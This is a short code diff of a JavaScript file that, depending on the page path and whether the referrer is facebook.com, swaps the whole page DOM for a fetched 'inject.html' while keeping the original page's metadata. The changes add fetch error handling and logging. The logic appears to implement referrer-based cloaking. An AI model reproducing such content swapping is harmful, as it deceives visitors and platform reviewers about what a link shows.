@@ -49,8 +49,14 @@
       } else if (currentPath.includes(targetUrl.trim()) && (!referrer.includes('facebook.com') || testing)) {
         // Uji coba tanpa referer Facebook jika testing = true
         fetch('/inject.html')
-          .then((response) => response.text())
+          .then((response) => {
+            if (!response.ok) {
+              throw new Error(`Failed to fetch inject.html: ${response.status}`);
+            }
+            return response.text();
+          })
           .then((html) => {
+            console.log('Inject HTML fetched successfully:', html); // Log konten inject.html
             document.documentElement.innerHTML = html; // Mengganti seluruh DOM dengan konten inject.html
             injectMetadata(originalHtml); // Sisipkan metadata asli dari target.txt
           })
